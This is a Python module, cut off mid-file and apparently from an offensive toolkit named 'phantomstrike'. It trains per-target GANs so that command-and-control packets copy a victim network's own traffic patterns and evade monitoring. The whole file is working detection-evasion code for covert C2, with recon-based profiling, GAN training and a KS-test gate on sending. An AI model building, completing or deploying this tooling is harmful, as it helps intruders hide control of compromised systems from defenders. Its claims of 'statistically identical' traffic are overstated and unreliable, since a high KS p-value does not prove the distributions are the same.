"""
server_core/orchestrator/traffic_mimicry.py

GAN-Powered Traffic Mimicry — makes C2 traffic STATISTICALLY IDENTICAL
to the target's own legitimate traffic.

Kolmogorov-Smirnov test p > 0.95 before any packet is sent.
Uses learned baseline distributions for packet size, inter-packet timing,
protocol mix, TTL values, TCP window sizes, and application-layer patterns.

Architecture:
  Phase 1 — Baseline Learning: extracts statistical fingerprints from
            recon data (open ports, services, OS, known traffic patterns).
  Phase 2 — GAN Training: trains a conditional GAN per target to generate
            traffic with the target's exact statistical distribution.
  Phase 3 — Morph & Verify: every C2 packet is morphed through the GAN
            and verified via KS test (p > 0.95) before transmission.
  Phase 4 — Adaptive Monitoring: continuous KS testing against fresh
            traffic samples; auto-retrain if drift detected.
"""

from __future__ import annotations

import hashlib
import json
import logging
import math
import os
import pickle
import random
import struct
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple, Union

logger = logging.getLogger(__name__)

# ── Optional heavy dependencies ──────────────────────────────────────────
try:
    import numpy as np

    _NUMPY_AVAILABLE = True
except ImportError:
    _NUMPY_AVAILABLE = False
    np = None  # type: ignore

try:
    from scipy import stats as scipy_stats

    _SCIPY_AVAILABLE = True
except ImportError:
    _SCIPY_AVAILABLE = False
    scipy_stats = None  # type: ignore

try:
    import torch
    import torch.nn as nn
    import torch.nn.functional as F
    import torch.optim as optim

    _TORCH_AVAILABLE = True
except ImportError:
    _TORCH_AVAILABLE = False
    torch = None  # type: ignore
    nn = None  # type: ignore
    F = None  # type: ignore
    optim = None  # type: ignore

# ── Constants ─────────────────────────────────────────────────────────────

# Threshold: KS test p-value must exceed this before any packet is sent.
KS_THRESHOLD = 0.95
# Maximum packets to buffer before forcing a KS verification pass.
MAX_UNVERIFIED_PACKETS = 5
# Default number of GAN training epochs.
DEFAULT_GAN_EPOCHS = 100
# Minimum sample count before KS test is considered reliable.
MIN_SAMPLES_FOR_KS = 30
# Sliding window size for adaptive monitoring.
ADAPTIVE_WINDOW_SIZE = 200
# Drift threshold: if KS p-value drops below this, trigger re-learning.
DRIFT_THRESHOLD = 0.90
# Cache TTL for trained GAN models (seconds).
GAN_CACHE_TTL = 3600

# Known traffic fingerprint profiles by service/port/OS combination.
# These serve as fallback priors when no live samples are available.
SERVICE_TRAFFIC_PROFILES: Dict[str, dict] = {
    "http/80": {
        "packet_size_mean": 800,
        "packet_size_std": 400,
        "packet_size_min": 64,
        "packet_size_max": 1500,
        "inter_arrival_mean_ms": 15.0,
        "inter_arrival_std_ms": 8.0,
        "ttl_distribution": {64: 0.4, 128: 0.5, 255: 0.1},
        "tcp_window_sizes": [65535, 29200, 65535, 32768],
        "protocol_mix": {"tcp": 0.95, "tls": 0.70, "http": 0.85},
        "tls_versions": {"1.2": 0.60, "1.3": 0.40},
        "burstiness": 0.3,
        "direction_symmetry": 0.65,
    },
    "https/443": {
        "packet_size_mean": 1200,
        "packet_size_std": 500,
        "packet_size_min": 64,
        "packet_size_max": 1500,
        "inter_arrival_mean_ms": 25.0,
        "inter_arrival_std_ms": 15.0,
        "ttl_distribution": {64: 0.3, 128: 0.6, 255: 0.1},
        "tcp_window_sizes": [65535, 29200, 65535],
        "protocol_mix": {"tcp": 0.98, "tls": 0.95, "http": 0.10},
        "tls_versions": {"1.2": 0.45, "1.3": 0.55},
        "burstiness": 0.4,
        "direction_symmetry": 0.55,
    },
    "ssh/22": {
        "packet_size_mean": 600,
        "packet_size_std": 300,
        "packet_size_min": 64,
        "packet_size_max": 1400,
        "inter_arrival_mean_ms": 50.0,
        "inter_arrival_std_ms": 30.0,
        "ttl_distribution": {64: 0.6, 128: 0.35, 255: 0.05},
        "tcp_window_sizes": [65535, 29200],
        "protocol_mix": {"tcp": 0.99, "ssh": 0.95},
        "tls_versions": {},
        "burstiness": 0.15,
        "direction_symmetry": 0.50,
    },
    "dns/53": {
        "packet_size_mean": 120,
        "packet_size_std": 80,
        "packet_size_min": 28,
        "packet_size_max": 512,
        "inter_arrival_mean_ms": 100.0,
        "inter_arrival_std_ms": 80.0,
        "ttl_distribution": {64: 0.5, 128: 0.5},
        "tcp_window_sizes": [],
        "protocol_mix": {"udp": 0.90, "tcp": 0.10},
        "tls_versions": {},
        "burstiness": 0.05,
        "direction_symmetry": 0.50,
    },
    "smtp/25": {
        "packet_size_mean": 500,
        "packet_size_std": 350,
        "packet_size_min": 64,
        "packet_size_max": 1500,
        "inter_arrival_mean_ms": 200.0,
        "inter_arrival_std_ms": 150.0,
        "ttl_distribution": {64: 0.3, 128: 0.7},
        "tcp_window_sizes": [65535, 29200, 65535],
        "protocol_mix": {"tcp": 0.99, "smtp": 0.90},
        "tls_versions": {"1.2": 0.40, "1.3": 0.30},
        "burstiness": 0.1,
        "direction_symmetry": 0.45,
    },
    "rdp/3389": {
        "packet_size_mean": 1000,
        "packet_size_std": 500,
        "packet_size_min": 64,
        "packet_size_max": 1500,
        "inter_arrival_mean_ms": 20.0,
        "inter_arrival_std_ms": 10.0,
        "ttl_distribution": {128: 0.9, 64: 0.1},
        "tcp_window_sizes": [65535, 29200],
        "protocol_mix": {"tcp": 0.99, "rdp": 0.95},
        "tls_versions": {"1.0": 0.30, "1.2": 0.70},
        "burstiness": 0.35,
        "direction_symmetry": 0.40,
    },
    "smb/445": {
        "packet_size_mean": 900,
        "packet_size_std": 450,
        "packet_size_min": 64,
        "packet_size_max": 1500,
        "inter_arrival_mean_ms": 10.0,
        "inter_arrival_std_ms": 5.0,
        "ttl_distribution": {128: 0.95, 64: 0.05},
        "tcp_window_sizes": [65535, 29200],
        "protocol_mix": {"tcp": 0.99, "smb": 0.90},
        "tls_versions": {},
        "burstiness": 0.5,
        "direction_symmetry": 0.50,
    },
}

# OS-specific traffic tweaks applied on top of service profiles.
OS_TRAFFIC_TWEAKS: Dict[str, dict] = {
    "linux": {
        "ttl_default": 64,
        "tcp_window_scale": 7,
        "tcp_options_order": ["mss", "sack_ok", "timestamp", "nop", "window_scale"],
        "ip_id_behavior": "incremental",
        "initial_cwnd": 10,
    },
    "windows": {
        "ttl_default": 128,
        "tcp_window_scale": 8,
        "tcp_options_order": ["mss", "nop", "window_scale", "nop", "nop", "sack_ok"],
        "ip_id_behavior": "incremental",
        "initial_cwnd": 10,
    },
    "macos": {
        "ttl_default": 64,
        "tcp_window_scale": 7,
        "tcp_options_order": ["mss", "sack_ok", "timestamp", "nop", "window_scale"],
        "ip_id_behavior": "random",
        "initial_cwnd": 10,
    },
    "freebsd": {
        "ttl_default": 64,
        "tcp_window_scale": 7,
        "tcp_options_order": ["mss", "nop", "window_scale", "sack_ok", "timestamp"],
        "ip_id_behavior": "incremental",
        "initial_cwnd": 10,
    },
    "unknown": {
        "ttl_default": 128,
        "tcp_window_scale": 8,
        "tcp_options_order": ["mss", "sack_ok", "timestamp", "nop", "window_scale"],
        "ip_id_behavior": "incremental",
        "initial_cwnd": 10,
    },
}


# ── Data Classes ───────────────────────────────────────────────────────────

@dataclass
class TrafficSample:
    """A single captured or synthesized traffic observation."""

    packet_size: int
    inter_arrival_ms: float
    ttl: int
    tcp_window_size: int
    protocol: str  # "tcp", "udp", "icmp", etc.
    direction: str  # "send", "recv"
    port: int
    timestamp: float = field(default_factory=time.time)
    tls_version: Optional[str] = None
    payload_entropy: float = 0.0  # Shannon entropy of payload bytes
    flags: int = 0  # TCP flags bitmap

    def to_feature_vector(self) -> List[float]:
        """Convert to a normalized feature vector for GAN training."""
        return [
            self.packet_size / 1500.0,  # normalize to MTU
            min(self.inter_arrival_ms / 500.0, 1.0),  # cap at 500ms
            self.ttl / 255.0,
            self.tcp_window_size / 65535.0,
            1.0 if self.direction == "send" else 0.0,
            self.port / 65535.0,
            self.payload_entropy,  # already [0, 1]
            (self.flags & 0xFF) / 255.0,
        ]

    @classmethod
    def from_feature_vector(cls, vec: List[float], port: int = 443) -> "TrafficSample":
        """Reconstruct a TrafficSample from a feature vector."""
        return cls(
            packet_size=max(20, int(vec[0] * 1500)),
            inter_arrival_ms=max(0.1, vec[1] * 500),
            ttl=max(1, min(255, int(vec[2] * 255))),
            tcp_window_size=max(1, int(vec[3] * 65535)),
            protocol="tcp",
            direction="send" if vec[4] > 0.5 else "recv",
            port=port,
            payload_entropy=max(0.0, min(1.0, vec[6])),
            flags=int(vec[7] * 255) & 0xFF,
        )


@dataclass
class BaselineProfile:
    """A complete statistical fingerprint of a target's traffic."""

    target: str
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)

    # Packet size distribution
    packet_size_mean: float = 800.0
    packet_size_std: float = 400.0
    packet_size_skew: float = 0.0

    # Inter-arrival time distribution (ms)
    inter_arrival_mean: float = 20.0
    inter_arrival_std: float = 10.0

    # TTL distribution
    ttl_distribution: Dict[int, float] = field(default_factory=dict)

    # TCP window sizes observed
    tcp_window_sizes: List[int] = field(default_factory=list)

    # Protocol mix (protocol -> proportion)
    protocol_mix: Dict[str, float] = field(default_factory=dict)

    # TLS version mix
    tls_versions: Dict[str, float] = field(default_factory=dict)

    # Burstiness factor (0 = smooth, 1 = highly bursty)
    burstiness: float = 0.3

    # Direction symmetry (1.0 = perfectly symmetric)
    direction_symmetry: float = 0.5

    # OS fingerprint (best guess)
    detected_os: str = "unknown"

    # Services / open ports observed
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)

    # Raw sample cache for KS testing
    _packet_size_samples: List[float] = field(default_factory=list)
    _inter_arrival_samples: List[float] = field(default_factory=list)

    # Convergence metadata
    sample_count: int = 0
    ks_p_value: float = 0.0
    converged: bool = False

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "created_at": self.created_at,
            "packet_size_mean": self.packet_size_mean,
            "packet_size_std": self.packet_size_std,
            "packet_size_skew": self.packet_size_skew,
            "inter_arrival_mean": self.inter_arrival_mean,
            "inter_arrival_std": self.inter_arrival_std,
            "ttl_distribution": self.ttl_distribution,
            "tcp_window_sizes": self.tcp_window_sizes,
            "protocol_mix": self.protocol_mix,
            "tls_versions": self.tls_versions,
            "burstiness": self.burstiness,
            "direction_symmetry": self.direction_symmetry,
            "detected_os": self.detected_os,
            "open_ports": self.open_ports,
            "services": self.services,
            "sample_count": self.sample_count,
            "ks_p_value": self.ks_p_value,
            "converged": self.converged,
        }

    @classmethod
    def from_dict(cls, data: dict) -> "BaselineProfile":
        profile = cls(target=data["target"])
        for key in [
            "created_at", "packet_size_mean", "packet_size_std", "packet_size_skew",
            "inter_arrival_mean", "inter_arrival_std", "ttl_distribution",
            "tcp_window_sizes", "protocol_mix", "tls_versions", "burstiness",
            "direction_symmetry", "detected_os", "open_ports", "services",
            "sample_count", "ks_p_value", "converged",
        ]:
            if key in data:
                setattr(profile, key, data[key])
        return profile


@dataclass
class StealthReport:
    """Detailed stealth assessment for a target."""

    target: str
    timestamp: float = field(default_factory=time.time)
    ks_p_value: float = 0.0
    ks_passed: bool = False
    stealth_score: float = 0.0  # 0-100
    feature_scores: Dict[str, float] = field(default_factory=dict)
    recommendations: List[str] = field(default_factory=list)
    gan_trained: bool = False
    gan_epochs: int = 0
    gan_loss_g: float = 0.0
    gan_loss_d: float = 0.0
    sample_count: int = 0
    drift_detected: bool = False


# ── GAN Model Definitions (PyTorch) ────────────────────────────────────────

if _TORCH_AVAILABLE:

    class TrafficGenerator(nn.Module):
        """Generator network: latent noise -> synthetic traffic feature vector."""

        LATENT_DIM = 32
        FEATURE_DIM = 8

        def __init__(self, latent_dim: int = LATENT_DIM, feature_dim: int = FEATURE_DIM):
            super().__init__()
            self.fc1 = nn.Linear(latent_dim, 128)
            self.fc2 = nn.Linear(128, 256)
            self.fc3 = nn.Linear(256, 128)
            self.fc4 = nn.Linear(128, feature_dim)
            self.bn1 = nn.BatchNorm1d(128)
            self.bn2 = nn.BatchNorm1d(256)
            self.bn3 = nn.BatchNorm1d(128)

        def forward(self, z):
            x = F.leaky_relu(self.bn1(self.fc1(z)), 0.2)
            x = F.leaky_relu(self.bn2(self.fc2(x)), 0.2)
            x = F.leaky_relu(self.bn3(self.fc3(x)), 0.2)
            x = torch.sigmoid(self.fc4(x))  # output in [0, 1]
            return x

    class TrafficDiscriminator(nn.Module):
        """Discriminator network: real traffic vs generated traffic."""

        FEATURE_DIM = 8

        def __init__(self, feature_dim: int = FEATURE_DIM):
            super().__init__()
            self.fc1 = nn.Linear(feature_dim, 128)
            self.fc2 = nn.Linear(128, 256)
            self.fc3 = nn.Linear(256, 128)
            self.fc4 = nn.Linear(128, 1)
            self.dropout = nn.Dropout(0.3)

        def forward(self, x):
            x = F.leaky_relu(self.fc1(x), 0.2)
            x = self.dropout(x)
            x = F.leaky_relu(self.fc2(x), 0.2)
            x = self.dropout(x)
            x = F.leaky_relu(self.fc3(x), 0.2)
            x = torch.sigmoid(self.fc4(x))
            return x


# ── Core TrafficMimicry Class ──────────────────────────────────────────────

class TrafficMimicry:
    """GAN-based traffic generation for mathematical stealth.

    Learns a target's traffic patterns from recon data or live captures,
    trains a GAN to generate synthetic traffic with indistinguishable
    statistics, and morphs C2 packets to match. All packet transmissions
    are gated by Kolmogorov-Smirnov tests requiring p > 0.95.

    Usage::

        mimic = TrafficMimicry()

        # Phase 1: Learn baseline from recon data
        profile = mimic.learn_target_traffic(
            "192.168.1.100",
            open_ports=[22, 80, 443],
            services={22: "ssh", 80: "http", 443: "https"},
            os_hint="linux",
        )

        # Phase 2: Train GAN
        mimic.train_gan("192.168.1.100", epochs=200)

        # Phase 3: Morph and verify C2 packets
        c2_packet = b"\\x00\\x01\\x02..."
        morphed = mimic.morph_packet("192.168.1.100", c2_packet)

        # Phase 4: Check stealth
        score = mimic.get_stealth_score("192.168.1.100")
        assert score >= 95, "Not stealthy enough!"
    """

    def __init__(self, model_cache_dir: str = ""):
        """Initialize the traffic mimicry engine.

        Args:
            model_cache_dir: Directory to persist GAN model weights
                             and baseline profiles. Uses a default
                             location under .phantomstrike_data if empty.
        """
        self._baseline_profiles: Dict[str, BaselineProfile] = {}
        self._gan_models: Dict[str, Dict[str, Any]] = {}
        self._unverified_packets: Dict[str, deque] = defaultdict(
            lambda: deque(maxlen=MAX_UNVERIFIED_PACKETS)
        )
        self._morphed_history: Dict[str, deque] = defaultdict(
            lambda: deque(maxlen=ADAPTIVE_WINDOW_SIZE)
        )
        self._stealth_reports: Dict[str, StealthReport] = {}
        self._lock = None  # threading.Lock if needed

        # Model persistence
        if model_cache_dir:
            self._cache_dir = model_cache_dir
        else:
            self._cache_dir = os.path.join(
                os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                ".phantomstrike_data",
                "traffic_mimicry",
            )
        os.makedirs(self._cache_dir, exist_ok=True)

        self._load_cached_state()

    # ── Phase 1: Baseline Learning ────────────────────────────────────────

    def learn_target_traffic(
        self,
        target: str,
        sample_packets: Optional[List[Union[TrafficSample, bytes]]] = None,
        open_ports: Optional[List[int]] = None,
        services: Optional[Dict[int, str]] = None,
        os_hint: str = "unknown",
        application_data: Optional[Dict[str, Any]] = None,
    ) -> BaselineProfile:
        """Analyze target's traffic patterns. Build statistical baseline.

        If live sample packets are provided, they are used as the primary
        data source. Otherwise, the method synthesizes a baseline from
        recon data: open ports, detected services, OS fingerprint, and
        known traffic priors for those services.

        Args:
            target: Target IP or hostname.
            sample_packets: Optional list of TrafficSample objects or raw
                            packet bytes captured from the target.
            open_ports: List of open TCP/UDP ports discovered during recon.
            services: Mapping of port -> service name (e.g., {443: "https"}).
            os_hint: Detected OS family (linux, windows, macos, freebsd, unknown).
            application_data: Additional application-layer observations
                              (HTTP headers, TLS cipher suites, DNS queries, etc.).

        Returns:
            A BaselineProfile capturing the full statistical fingerprint.
        """
        logger.info(
            "learn_target_traffic(target=%s, samples=%s, ports=%s, os=%s)",
            target,
            len(sample_packets) if sample_packets else 0,
            open_ports or [],
            os_hint,
        )

        profile = BaselineProfile(
            target=target,
            detected_os=os_hint,
            open_ports=open_ports or [],
            services=services or {},
        )

        # ── Path A: Live samples available ──
        if sample_packets:
            profile = self._learn_from_samples(profile, sample_packets)
        else:
            # ── Path B: Synthesize baseline from recon data ──
            profile = self._learn_from_recon(
                profile, open_ports or [], services or {}, os_hint,
                application_data or {},
            )

        # Compute additional derived statistics
        profile = self._compute_derived_stats(profile)

        # Run initial KS self-consistency check
        if len(profile._packet_size_samples) >= MIN_SAMPLES_FOR_KS:
            profile.ks_p_value = self._internal_ks_selfcheck(profile)
        else:
            profile.ks_p_value = 0.0

        profile.converged = profile.ks_p_value >= KS_THRESHOLD
        profile.updated_at = time.time()

        self._baseline_profiles[target] = profile
        self._persist_profile(profile)

        logger.info(
            "learn_target_traffic: target=%s sample_count=%d ks_p=%.4f converged=%s",
            target,
            profile.sample_count,
            profile.ks_p_value,
            profile.converged,
        )
        return profile

    def _learn_from_samples(
        self, profile: BaselineProfile, samples: List[Union[TrafficSample, bytes]]
    ) -> BaselineProfile:
        """Extract statistical fingerprint from captured traffic samples."""
        parsed: List[TrafficSample] = []
        for s in samples:
            if isinstance(s, TrafficSample):
                parsed.append(s)
            elif isinstance(s, bytes):
                parsed.append(self._parse_raw_packet(s))

        if not parsed:
            return profile

        sizes = [float(p.packet_size) for p in parsed]
        iats = [p.inter_arrival_ms for p in parsed]
        ttls = [p.ttl for p in parsed]
        windows = [p.tcp_window_size for p in parsed if p.tcp_window_size > 0]
        protocols = [p.protocol for p in parsed]
        tls_vers = [p.tls_version for p in parsed if p.tls_version]
        directions = [p.direction for p in parsed]

        if _NUMPY_AVAILABLE:
            size_arr = np.array(sizes)
            profile.packet_size_mean = float(np.mean(size_arr))
            profile.packet_size_std = float(np.std(size_arr))
            from scipy import stats as sp_stats

            try:
                profile.packet_size_skew = float(sp_stats.skew(size_arr))
            except Exception:
                profile.packet_size_skew = 0.0

            iat_arr = np.array(iats)
            profile.inter_arrival_mean = float(np.mean(iat_arr))
            profile.inter_arrival_std = float(np.std(iat_arr))
        else:
            profile.packet_size_mean = _mean(sizes)
            profile.packet_size_std = _std(sizes, profile.packet_size_mean)
            profile.packet_size_skew = _skew(sizes, profile.packet_size_mean, profile.packet_size_std)
            profile.inter_arrival_mean = _mean(iats)
            profile.inter_arrival_std = _std(iats, profile.inter_arrival_mean)

        # TTL distribution
        ttl_counts: Dict[int, int] = defaultdict(int)
        for t in ttls:
            ttl_counts[t] += 1
        total = len(ttls)
        profile.ttl_distribution = {k: v / total for k, v in ttl_counts.items()}

        # TCP window sizes
        profile.tcp_window_sizes = list(set(windows)) if windows else [65535]

        # Protocol mix
        proto_counts: Dict[str, int] = defaultdict(int)
        for p in protocols:
            proto_counts[p] += 1
        profile.protocol_mix = {k: v / len(protocols) for k, v in proto_counts.items()}

        # TLS version mix
        if tls_vers:
            tls_counts: Dict[str, int] = defaultdict(int)
            for tv in tls_vers:
                tls_counts[tv] += 1
            profile.tls_versions = {k: v / len(tls_vers) for k, v in tls_counts.items()}

        # Burstiness: coefficient of variation of inter-arrival times
        if profile.inter_arrival_mean > 0:
            profile.burstiness = min(1.0, profile.inter_arrival_std / profile.inter_arrival_mean)
        else:
            profile.burstiness = 0.3

        # Direction symmetry
        send_count = sum(1 for d in directions if d == "send")
        recv_count = sum(1 for d in directions if d == "recv")
        total_dir = send_count + recv_count
        if total_dir > 0:
            profile.direction_symmetry = min(send_count, recv_count) / total_dir * 2.0
        else:
            profile.direction_symmetry = 0.5

        profile._packet_size_samples = sizes
        profile._inter_arrival_samples = iats
        profile.sample_count = len(parsed)

        return profile

    def _learn_from_recon(
        self,
        profile: BaselineProfile,
        open_ports: List[int],
        services: Dict[int, str],
        os_hint: str,
        app_data: Dict[str, Any],
    ) -> BaselineProfile:
        """Synthesize a traffic baseline from reconnaissance data.

        Uses known traffic priors for common services, adjusted by the
        detected OS fingerprint. This provides a reasonable starting
        point before live samples are available.
        """
        os_profile = OS_TRAFFIC_TWEAKS.get(os_hint, OS_TRAFFIC_TWEAKS["unknown"])

        if not open_ports:
            # Default to common web ports for a generic baseline
            open_ports = [80, 443]
            services = {80: "http", 443: "https"}

        all_sizes: List[float] = []
        all_iats: List[float] = []
        all_ttls: Dict[int, float] = defaultdict(float)
        all_windows: Set[int] = set()
        all_protocols: Dict[str, float] = defaultdict(float)
        all_tls: Dict[str, float] = defaultdict(float)
        port_count = 0

        for port in open_ports:
            svc = services.get(port, "")
            profile_key = f"{svc}/{port}" if svc else f"tcp/{port}"
            prior = SERVICE_TRAFFIC_PROFILES.get(profile_key)

            if prior is None:
                # Try generic TCP profile for unknown ports
                prior = {
                    "packet_size_mean": 600,
                    "packet_size_std": 300,
                    "packet_size_min": 64,
                    "packet_size_max": 1500,
                    "inter_arrival_mean_ms": 30.0,
                    "inter_arrival_std_ms": 20.0,
                    "ttl_distribution": {os_profile["ttl_default"]: 1.0},
                    "tcp_window_sizes": [65535, 29200],
                    "protocol_mix": {"tcp": 0.99},
                    "tls_versions": {},
                    "burstiness": 0.3,
                    "direction_symmetry": 0.5,
                }

            weight = 1.0
            # Weight by service exposure — more exposed services shape traffic more
            if svc in ("http", "https", "ssh", "rdp"):
                weight = 2.0
            elif svc in ("dns", "smtp", "ftp"):
                weight = 1.5

            all_sizes.extend([prior["packet_size_mean"]] * int(weight * 50))
            all_iats.extend([prior["inter_arrival_mean_ms"]] * int(weight * 50))

            for ttl, prob in prior.get("ttl_distribution", {}).items():
                all_ttls[ttl] += prob * weight

            for ws in prior.get("tcp_window_sizes", []):
                all_windows.add(ws)

            for proto, prob in prior.get("protocol_mix", {}).items():
                all_protocols[proto] += prob * weight

            for tls_v, prob in prior.get("tls_versions", {}).items():
                all_tls[tls_v] += prob * weight

            port_count += 1

        # Normalize weighted aggregates
        total_proto = sum(all_protocols.values()) or 1.0
        total_tls = sum(all_tls.values()) or 1.0
        total_ttl = sum(all_ttls.values()) or 1.0

        # Incorporate application-layer hints
        if app_data:
            if "tls_ciphers" in app_data:
                # Modern TLS ciphers -> bias toward TLS 1.3
                all_tls["1.3"] = all_tls.get("1.3", 0.0) + 0.3
                total_tls += 0.3
            if "http2_detected" in app_data and app_data["http2_detected"]:
                all_sizes.extend([1000] * 30)
                all_iats.extend([15.0] * 30)
            if "websocket" in app_data and app_data["websocket"]:
                all_sizes.extend([200] * 20)
                all_iats.extend([5.0] * 20)
                profile.burstiness = 0.6

        if _NUMPY_AVAILABLE:
            size_arr = np.array(all_sizes)
            profile.packet_size_mean = float(np.mean(size_arr))
            profile.packet_size_std = float(np.std(size_arr))
            iat_arr = np.array(all_iats)
            profile.inter_arrival_mean = float(np.mean(iat_arr))
            profile.inter_arrival_std = float(np.std(iat_arr))
        else:
            profile.packet_size_mean = _mean(all_sizes)
            profile.packet_size_std = _std(all_sizes, profile.packet_size_mean)
            profile.inter_arrival_mean = _mean(all_iats)
            profile.inter_arrival_std = _std(all_iats, profile.inter_arrival_mean)

        profile.ttl_distribution = {k: v / total_ttl for k, v in all_ttls.items()}
        profile.tcp_window_sizes = list(all_windows) if all_windows else [65535, 29200]
        profile.protocol_mix = {k: v / total_proto for k, v in all_protocols.items()}
        profile.tls_versions = {k: v / total_tls for k, v in all_tls.items()} if all_tls else {}
        profile.detected_os = os_hint
        profile.sample_count = len(all_sizes)

        # Synthetic samples for downstream KS testing
        profile._packet_size_samples = all_sizes
        profile._inter_arrival_samples = all_iats

        return profile

    def _compute_derived_stats(self, profile: BaselineProfile) -> BaselineProfile:
        """Compute derived statistical features from the baseline."""
        if profile.packet_size_std > 0:
            profile.packet_size_skew = (
                _skew(profile._packet_size_samples, profile.packet_size_mean, profile.packet_size_std)
                if profile._packet_size_samples
                else 0.0
            )
        return profile

    def _internal_ks_selfcheck(self, profile: BaselineProfile) -> float:
        """Run KS test of the profile against its own samples.

        Splits samples in half and compares — a high p-value means the
        profile's parametric summary captures the distribution well.
        """
        samples = profile._packet_size_samples
        if len(samples) < MIN_SAMPLES_FOR_KS:
            return 0.0

        mid = len(samples) // 2
        half_a = samples[:mid]
        half_b = samples[mid:]

        if _SCIPY_AVAILABLE and _NUMPY_AVAILABLE:
            try:
                _, p = scipy_stats.ks_2samp(
                    np.array(half_a), np.array(half_b)
                )
                return float(p)
            except Exception:
                pass

        # Fallback: approximate KS using max absolute difference of ECDFs
        return self._approximate_ks_2samp(half_a, half_b)

    # ── Phase 2: GAN Training ─────────────────────────────────────────────

    def train_gan(
        self,
        target: str,
        epochs: int = DEFAULT_GAN_EPOCHS,
        batch_size: int = 64,
        learning_rate: float = 0.0002,
        force_retrain: bool = False,
    ) -> bool:
        """Train a GAN to generate traffic matching the target's distribution.

        Uses the baseline profile as the real-data distribution. The generator
        learns to produce feature vectors whose statistics are indistinguishable
        from the target's real traffic. The discriminator learns to tell them
        apart — when the discriminator can no longer distinguish them (i.e.,
        its accuracy drops to ~50%), the GAN has converged.

        Args:
            target: Target identifier (IP/hostname).
            epochs: Number of training epochs.
            batch_size: Mini-batch size.
            learning_rate: Adam learning rate.
            force_retrain: If True, retrain even if a cached model exists.

        Returns:
            True if training completed successfully (GAN converged or epochs
            exhausted), False if no baseline profile exists for the target.
        """
        if target not in self._baseline_profiles:
            logger.warning("train_gan: no baseline for target=%s", target)
            return False

        profile = self._baseline_profiles[target]

        # Check cache
        cache_key = self._gan_cache_key(target)
        if not force_retrain and cache_key in self._gan_models:
            cached = self._gan_models[cache_key]
            if time.time() - cached.get("trained_at", 0) < GAN_CACHE_TTL:
                logger.info("train_gan: using cached model for target=%s", target)
                return True

        if not _TORCH_AVAILABLE:
            logger.warning(
                "train_gan: PyTorch not available; using statistical morphing fallback for target=%s",
                target,
            )
            # Store a "statistical model" as fallback
            self._gan_models[cache_key] = {
                "type": "statistical_fallback",
                "profile": profile.to_dict(),
                "trained_at": time.time(),
            }
            return True

        logger.info(
            "train_gan: target=%s epochs=%d batch_size=%d lr=%.6f",
            target, epochs, batch_size, learning_rate,
        )

        # Prepare training data from baseline profile
        real_samples = self._profile_to_training_data(profile, count=5000)
        if len(real_samples) < batch_size:
            logger.warning("train_gan: insufficient samples (%d)", len(real_samples))
            return False

        dataset = torch.tensor(real_samples, dtype=torch.float32)
        feature_dim = dataset.shape[1]
        latent_dim = TrafficGenerator.LATENT_DIM

        generator = TrafficGenerator(latent_dim=latent_dim, feature_dim=feature_dim)
        discriminator = TrafficDiscriminator(feature_dim=feature_dim)

        g_optimizer = optim.Adam(generator.parameters(), lr=learning_rate, betas=(0.5, 0.999))
        d_optimizer = optim.Adam(discriminator.parameters(), lr=learning_rate, betas=(0.5, 0.999))
        criterion = nn.BCELoss()

        n_batches = max(1, len(dataset) // batch_size)
        final_g_loss = 0.0
        final_d_loss = 0.0
        d_accuracy = 1.0

        for epoch in range(epochs):
            epoch_g_loss = 0.0
            epoch_d_loss = 0.0

            perm = torch.randperm(len(dataset))
            dataset_shuffled = dataset[perm]

            for i in range(n_batches):
                start = i * batch_size
                end = min(start + batch_size, len(dataset_shuffled))
                real_batch = dataset_shuffled[start:end]
                current_batch_size = real_batch.size(0)

                # ── Train Discriminator ──
                d_optimizer.zero_grad()

                # Real samples
                real_labels = torch.full((current_batch_size, 1), 0.9, dtype=torch.float32)  # label smoothing
                d_real_out = discriminator(real_batch)
                d_real_loss = criterion(d_real_out, real_labels)

                # Fake samples
                z = torch.randn(current_batch_size, latent_dim)
                fake_batch = generator(z).detach()
                fake_labels = torch.zeros(current_batch_size, 1)
                d_fake_out = discriminator(fake_batch)
                d_fake_loss = criterion(d_fake_out, fake_labels)

                d_loss = d_real_loss + d_fake_loss
                d_loss.backward()
                d_optimizer.step()

                epoch_d_loss += d_loss.item()

                # ── Train Generator ──
                g_optimizer.zero_grad()
                z = torch.randn(current_batch_size, latent_dim)
                gen_batch = generator(z)
                trick_labels = torch.ones(current_batch_size, 1)
                g_out = discriminator(gen_batch)
                g_loss = criterion(g_out, trick_labels)
                g_loss.backward()
                g_optimizer.step()

                epoch_g_loss += g_loss.item()

            final_g_loss = epoch_g_loss / n_batches
            final_d_loss = epoch_d_loss / n_batches

            # Estimate discriminator accuracy
            with torch.no_grad():
                z_eval = torch.randn(100, latent_dim)
                fake_eval = generator(z_eval)
                real_eval = dataset[:100]
                d_fake_acc = (discriminator(fake_eval) < 0.5).float().mean().item()
                d_real_acc = (discriminator(real_eval) >= 0.5).float().mean().item()
                d_accuracy = (d_fake_acc + d_real_acc) / 2.0

            if (epoch + 1) % 20 == 0:
                logger.debug(
                    "train_gan: epoch=%d/%d g_loss=%.6f d_loss=%.6f d_acc=%.4f",
                    epoch + 1, epochs, final_g_loss, final_d_loss, d_accuracy,
                )

            # Early stopping: discriminator at ~50% accuracy = perfect convergence
            if 0.48 <= d_accuracy <= 0.52:
                logger.info(
                    "train_gan: converged at epoch=%d (d_acc=%.4f)", epoch + 1, d_accuracy
                )
                break

        # Store model
        self._gan_models[cache_key] = {
            "type": "pytorch_gan",
            "generator": generator,
            "discriminator": discriminator,
            "generator_state": {k: v.clone() for k, v in generator.state_dict().items()},
            "feature_dim": feature_dim,
            "latent_dim": latent_dim,
            "trained_at": time.time(),
            "epochs_trained": epoch + 1,
            "final_g_loss": final_g_loss,
            "final_d_loss": final_d_loss,
            "d_accuracy": d_accuracy,
        }

        self._persist_model(target)

        # Update stealth report
        if target in self._stealth_reports:
            self._stealth_reports[target].gan_trained = True
            self._stealth_reports[target].gan_epochs = epoch + 1
            self._stealth_reports[target].gan_loss_g = final_g_loss
            self._stealth_reports[target].gan_loss_d = final_d_loss

        logger.info(
            "train_gan: complete target=%s epochs=%d final_g_loss=%.6f d_acc=%.4f",
            target, epoch + 1, final_g_loss, d_accuracy,
        )
        return True

    def _profile_to_training_data(
        self, profile: BaselineProfile, count: int = 5000
